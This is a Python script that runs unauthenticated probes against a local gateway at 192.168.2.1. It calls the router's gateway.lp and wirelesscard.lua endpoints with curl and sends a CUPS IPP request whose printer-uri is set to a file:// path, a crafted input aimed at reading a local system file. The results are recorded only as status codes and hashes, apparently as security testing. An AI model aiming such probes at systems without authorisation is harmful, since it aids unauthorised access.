#!/usr/bin/env python3
"""Small unauthenticated checks: wirelesscard.lua, GET action=URL, CUPS file URI."""
from __future__ import annotations

import hashlib
import json
import os
import re
import subprocess
import time
import urllib.parse
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
HOST = "192.168.2.1"
GAP = 2.0


def curl_get(path: str, timeout: int = 12) -> tuple[int, bytes]:
    cmd = [
        "curl", "--noproxy", "*", "--silent", "--show-error",
        "--connect-timeout", "4", f"--max-time", str(timeout),
        "--max-filesize", "1048576", "--write-out", "%{http_code}",
        f"http://{HOST}{path}",
    ]
    out = subprocess.run(cmd, capture_output=True)
    raw = out.stdout
    if len(raw) >= 3 and raw[-3:].isdigit():
        code = int(raw[-3:])
        body = raw[:-3]
    else:
        code = 0
        body = raw
    return code, body


def ipp_file_uri_probe() -> dict:
    """Single CUPS Validate-Job style probe with file:// printer-uri (read-only)."""
    uri = b"file:///proc/rip/0108"
    body = (
        b"\x01\x01\x00\x0b\x00\x00\x00\x01"
        b"\x01\x47\x00\x12attributes-charset\x00\x05utf-8"
        b"\x48\x00\x1battributes-natural-language\x00\x02en"
        b"\x45\x00\x0bprinter-uri\x00" + bytes([len(uri)]) + uri
    )
    req = urllib.request.Request(
        f"http://{HOST}:631/",
        data=body,
        method="POST",
        headers={"Content-Type": "application/ipp"},
    )
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = resp.read()
            return {
                "status": resp.getcode(),
                "bytes": len(data),
                "elapsed_s": round(time.monotonic() - t0, 3),
                "sha256": hashlib.sha256(data).hexdigest(),
                "error": None,
            }
    except Exception as exc:  # noqa: BLE001 — record timeout vs IPP error
        return {
            "status": None,
            "bytes": 0,
            "elapsed_s": round(time.monotonic() - t0, 3),
            "sha256": None,
            "error": type(exc).__name__,
        }


def main() -> None:
    os.umask(0o077)
    out_dir = ROOT / "artifacts" / "management" / time.strftime("surface-quick-%Y%m%dT%H%M%SZ", time.gmtime())
    out_dir.mkdir(parents=True, exist_ok=False)
    rows = []
    cases = [
        ("get_gateway_url", "/gateway.lp?action=URL"),
        ("get_wirelesscard", "/ajax/wirelesscard.lua?auto_update=true"),
        ("post_wirelesscard", "POST:/ajax/wirelesscard.lua?auto_update=true"),
    ]
    for index, (name, spec) in enumerate(cases):
        if index:
            time.sleep(GAP)
        if spec.startswith("POST:"):
            path = spec[5:]
            cmd = [
                "curl", "--noproxy", "*", "-X", "POST", "--silent", "--show-error",
                "--connect-timeout", "4", "--max-time", "12",
                "--write-out", "%{http_code}",
                f"http://{HOST}{path}",
            ]
            out = subprocess.run(cmd, capture_output=True)
            raw = out.stdout
            code = int(raw[-3:]) if len(raw) >= 3 and raw[-3:].isdigit() else 0
            body = raw[:-3] if len(raw) >= 3 else raw
        else:
            code, body = curl_get(spec)
        rows.append({
            "case": name,
            "status": code,
            "bytes": len(body),
            "login_marker": bool(re.search(rb"sign-me-in", body)),
            "json": body.strip().startswith(b"{"),
            "sha256": hashlib.sha256(body).hexdigest() if body else None,
        })
    time.sleep(GAP)
    rows.append({"case": "cups_file_uri", **ipp_file_uri_probe()})
    (out_dir / "summary.json").write_text(json.dumps({"rows": rows}, indent=2) + "\n")
    print(json.dumps({"rows": rows}, indent=2))


if __name__ == "__main__":
    main()
